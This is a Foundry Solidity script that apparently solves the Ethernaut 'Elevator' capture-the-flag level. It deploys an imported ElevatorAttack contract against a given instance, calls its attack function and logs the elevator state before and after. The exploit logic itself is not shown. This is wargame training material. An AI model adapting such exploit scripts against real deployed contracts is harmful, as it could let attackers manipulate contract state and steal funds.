// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IElevator} from "../src/interfaces/IElevator.sol";
import {ElevatorAttack} from "../src/attackers/ElevatorAttack.sol";

contract ElevatorScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        IElevator target = IElevator(instance);

        bool topBefore = target.top();
        uint256 floorBefore = target.floor();

        console2.log("--- Elevator Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Top Before     :", topBefore);
        console2.log("Floor Before   :", floorBefore);

        if (topBefore) {
            console2.log("Elevator is already at the top! Submit instance in Ethernaut.");
            return;
        }

        vm.startBroadcast(privateKey);

        ElevatorAttack attackerContract = new ElevatorAttack(instance);
        console2.log("Deployed ElevatorAttack at:", address(attackerContract));

        attackerContract.attack();

        vm.stopBroadcast();

        bool topAfter = target.top();
        uint256 floorAfter = target.floor();
        console2.log("Top After      :", topAfter);
        console2.log("Floor After    :", floorAfter);

        require(topAfter, "Exploit failed: top is still false");
        console2.log(">>> SUCCESS! Elevator reached the top! Submit instance in Ethernaut. <<<");
    }
}
